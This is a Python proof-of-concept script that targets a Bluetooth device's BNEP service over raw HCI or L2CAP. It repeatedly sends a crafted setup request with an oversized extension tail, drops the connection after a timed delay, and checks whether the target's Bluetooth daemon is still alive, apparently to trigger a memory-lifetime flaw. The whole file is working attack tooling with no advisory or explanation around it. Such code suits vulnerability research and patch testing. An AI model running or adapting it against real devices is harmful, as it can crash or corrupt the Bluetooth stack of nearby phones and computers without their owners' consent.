#!/usr/bin/env python3
"""Probe deferred residual-control tail lifetime by abandoning valid setup before replay."""

import argparse
import time

from bnep_harness import (
    DEFAULT_SCID,
    DEFAULT_TARGET,
    build_extension_tail,
    choose_transport,
    close_acl,
    close_l2cap_socket,
    collect_events,
    collect_l2cap_payloads,
    connect_acl,
    make_setup_request,
    open_bnep_channel,
    open_l2cap_socket,
    open_user_socket,
    parse_setup_response,
    send_data,
)


def probe_round_raw_hci(target, crafted_setup, close_delay_ms, response_window_s):
    bt = open_user_socket()
    handle = None
    try:
        handle = connect_acl(bt, target)
        dcid = open_bnep_channel(bt, handle, DEFAULT_SCID)
        send_data(bt, handle, dcid, crafted_setup)
        events = collect_events(bt, DEFAULT_SCID, response_window_s)
        if close_delay_ms > 0:
            time.sleep(close_delay_ms / 1000.0)
        return [parse_setup_response(event["payload"]) for event in events if event["kind"] == "data"]
    finally:
        if handle is not None:
            close_acl(bt, handle)
        else:
            try:
                bt.close()
            except Exception:
                pass


def probe_round_l2cap(target, crafted_setup, close_delay_ms, response_window_s):
    sock = open_l2cap_socket(target)
    try:
        sock.sendall(crafted_setup)
        responses = collect_l2cap_payloads(sock, response_window_s)
        if close_delay_ms > 0:
            time.sleep(close_delay_ms / 1000.0)
        return [parse_setup_response(event["payload"]) for event in responses if event["kind"] == "data"]
    finally:
        close_l2cap_socket(sock)


def health_check_raw_hci(target):
    bt = open_user_socket()
    handle = None
    try:
        handle = connect_acl(bt, target)
        open_bnep_channel(bt, handle, DEFAULT_SCID)
        return True
    except Exception:
        return False
    finally:
        if handle is not None:
            close_acl(bt, handle)
        else:
            try:
                bt.close()
            except Exception:
                pass


def health_check_l2cap(target):
    sock = None
    try:
        sock = open_l2cap_socket(target)
        sock.sendall(make_setup_request(0x1115, 0x1116))
        collect_l2cap_payloads(sock, 0.25)
        return True
    except Exception:
        return False
    finally:
        if sock is not None:
            close_l2cap_socket(sock)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", nargs="?", default=DEFAULT_TARGET)
    parser.add_argument(
        "--transport",
        choices=["auto", "l2cap", "raw-hci"],
        default="auto",
        help="Bluetooth transport to use (default: auto)",
    )
    parser.add_argument("--rounds", type=int, default=25, help="Number of abandon-and-reconnect rounds")
    parser.add_argument("--tail-bytes", type=int, default=640, help="Approximate deferred-tail size to queue")
    parser.add_argument("--close-delay-ms", type=int, default=50, help="Delay after send before closing ACL")
    parser.add_argument(
        "--response-window",
        type=float,
        default=0.25,
        help="Seconds to watch for any immediate setup response before closing",
    )
    parser.add_argument(
        "--health-check-every",
        type=int,
        default=5,
        help="Run a plain BNEP channel health check every N rounds (0 disables)",
    )
    args = parser.parse_args()
    transport = choose_transport(args.transport)

    tail = build_extension_tail(args.tail_bytes)
    setup = make_setup_request(0x1115, 0x1116, extension_tail=tail)

    print("[*] Target: %s" % args.target)
    print("[*] Transport: %s" % transport)
    print("[*] Crafted setup length: %d bytes" % len(setup))
    print("[*] Extension tail length: %d bytes" % len(tail))
    print("[*] Rounds: %d" % args.rounds)
    print("[*] Watch Bluetooth RSS/logcat or daemon health in parallel while this runs")

    for round_idx in range(1, args.rounds + 1):
        print("\n=== round %d/%d ===" % (round_idx, args.rounds))
        if transport == "raw-hci":
            responses = probe_round_raw_hci(args.target, setup, args.close_delay_ms, args.response_window)
        else:
            responses = probe_round_l2cap(args.target, setup, args.close_delay_ms, args.response_window)
        parsed = [response for response in responses if response]
        if parsed:
            print("[*] Immediate setup responses before close:")
            for code, label in parsed:
                print("    code=%d %s" % (code, label))
        else:
            print("[*] No immediate setup response observed before close")

        if args.health_check_every and round_idx % args.health_check_every == 0:
            if transport == "raw-hci":
                healthy = health_check_raw_hci(args.target)
            else:
                healthy = health_check_l2cap(args.target)
            print("[*] Health check after round %d: %s" % (round_idx, "OK" if healthy else "FAILED"))


if __name__ == "__main__":
    main()
